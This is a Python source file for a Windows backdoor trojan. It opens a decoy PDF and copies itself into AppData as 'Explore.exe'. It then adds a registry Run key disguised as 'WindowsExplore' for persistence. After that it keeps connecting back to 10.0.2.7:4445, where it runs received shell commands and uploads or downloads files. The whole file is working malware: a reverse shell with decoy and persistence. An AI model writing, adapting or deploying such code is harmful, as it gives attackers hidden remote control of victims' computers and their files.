#!/usr/bin/env python
import socket, subprocess, json, os, base64, sys, shutil, time

class Backdoor:
	def __init__(self, ip, port):
		self.connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connect.connect((ip, port))

	def send(self, data):
		json_data = json.dumps(data)
		self.connect.send(json_data)

	def recive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connect.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue 

	def upload(self, name):
		with open(name, "rb") as file:
			return base64.b64encode(file.read())

	def download(self, name, content):
		with open(name, "wb") as file:
			file.write(base64.b64decode(content))
			return "Upload sucessful"

	def run(self):
		while True:
			command = self.recive()
			try:
				if command[0] == "exit":
					sys.exit()
				elif command[0] == "cd" and len(command)>1:
					os.chdir(command[1])
					data = "Directory changed"
				elif command[0] == "download":
					data = self.upload(command[1])
				elif command[0] == "upload":
					data = self.download(command[1], self.recive())
	 
				else:
					DEVNULL = open(os.devnull, 'wb')
					data = subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
			except Exception:
				data = "Error Occured"
			self.send(data)



# program start class end
loc = os.environ["appdata"]
loc = loc + "\Explore.exe"
file = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file, shell=True)

if not os.path.exists(loc):
	#nul = open(os.devnull, 'wb')
	shutil.copyfile(sys.executable, loc)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsExplore /t REG_SZ /d "'+ loc + '"', shell=True)
while True:
	try:
		payload = Backdoor("10.0.2.7", 4445)
		payload.run()
	except Exception:
		time.sleep(60)
